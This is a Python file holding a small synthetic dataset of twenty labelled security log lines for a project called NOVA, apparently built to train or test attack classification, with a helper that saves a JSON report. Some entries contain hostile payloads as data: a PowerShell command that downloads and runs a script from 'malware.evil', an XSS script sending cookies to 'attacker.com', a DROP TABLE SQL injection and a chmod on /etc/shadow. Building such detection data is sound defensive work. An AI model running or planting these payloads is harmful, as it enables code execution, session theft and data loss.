import json
from typing import List, Dict

# NOVA Phase 1: Definitive 20-Log Cybersecurity Dataset
def load_sample_dataset() -> List[Dict]:
    """Returns the merged set of 20 sample cyber logs."""
    logs = [
        # User's Suggested 5
        {"id": 1, "raw": "Failed login attempts from IP 45.67.89.12 (25 times in 5 min)", "label": "brute_force"},
        {"id": 2, "raw": "User 'admin' accessed sensitive HR database at 02:15 AM", "label": "insider_threat"},
        {"id": 3, "raw": "Normal traffic spike during business hours from known VPN", "label": "normal"},
        {"id": 4, "raw": "Suspicious PowerShell script execution on endpoint WIN-XYZ", "label": "malware"},
        {"id": 5, "raw": "Multiple DNS queries to rare domain 'x7k9p4q2z.com'", "label": "c2_beaconing"},
        
        # My Previous Detailed 15 (renamed/adapted)
        {"id": 6, "raw": "2026-04-13 22:20:05 [APP] user: 'jdoe' downloaded 500 files from '/secret/financials/' - Action: DOWNLOAD", "label": "data_exfiltration"},
        {"id": 7, "raw": "2026-04-13 22:25:30 [WAF] SQL Injection detected in 'search' query: 'SELECT * FROM users WHERE id=1; DROP TABLE users;' from 185.23.44.110", "label": "sql_injection"},
        {"id": 8, "raw": "2026-04-13 22:30:12 [PS] process: 'powershell.exe' executed command: 'IEX(New-Object Net.WebClient).DownloadString(\"http://malware.evil/shell.ps1\")' by user: 'service_account'", "label": "rce"},
        {"id": 9, "raw": "2026-04-13 22:35:45 [SMTP] Email sent to 500 recipients from 'noreply@yourcompany.com' with attachment 'invoice.zip.exe' from internal IP 10.0.0.101", "label": "phishing"},
        {"id": 10, "raw": "2026-04-13 22:40:02 [IDS] Suricata Alert: ET EXPLOIT possible CVE-2026-9999 heap overflow from 92.45.1.20 to 10.0.0.5", "label": "exploit_attempt"},
        {"id": 11, "raw": "2026-04-13 22:45:15 [AUTH] SUCCESS login for user 'admin' from 192.168.1.5 after 30 failed attempts", "label": "account_takeover"},
        {"id": 12, "raw": "2026-04-13 22:50:30 [DNS] High volume of DNS TXT queries to 'tunnel.badactor.com' from 10.0.0.5", "label": "dns_tunneling"},
        {"id": 13, "raw": "2026-04-13 22:55:01 [APP] user: 'mstone' changed password for 15 other accounts in 2 minutes", "label": "privilege_escalation"},
        {"id": 14, "raw": "2026-04-13 23:00:45 [EDR] suspicious driver 'kernel_rootkit.sys' loaded by process: 'svchost.exe'", "label": "rootkit_installation"},
        {"id": 15, "raw": "2026-04-13 23:05:12 [FIREWALL] Blocked port scanning activity from 77.88.99.100 on multiple ports", "label": "reconnaissance"},
        {"id": 16, "raw": "2026-04-13 23:10:45 [AUTH] FAILED login for user 'guest' from 10.0.0.25 (10 times in 1 min)", "label": "brute_force"},
        {"id": 17, "raw": "2026-04-13 23:15:12 [APP] user: 'developer' executed 'chmod 777 /etc/shadow'", "label": "root_access_attempt"},
        {"id": 18, "raw": "2026-04-13 23:20:01 [NETWORK] Large data transfer (10GB) to external IP 203.0.113.5", "label": "data_exfiltration"},
        {"id": 19, "raw": "2026-04-13 23:25:30 [WAF] XSS payload found in comment: '<script>fetch(\"http://attacker.com/steal?\"+document.cookie)</script>'", "label": "xss_attack"},
        {"id": 20, "raw": "2026-04-13 23:30:12 [SMTP] Inbound email from 'spoofed-domain.com' with malicious link", "label": "phishing"}
    ]
    return logs

def save_report(report_data, filename="nova_report.json"):
    """Saves the final NOVA report to a JSON file."""
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(report_data, f, indent=2)
    return filename
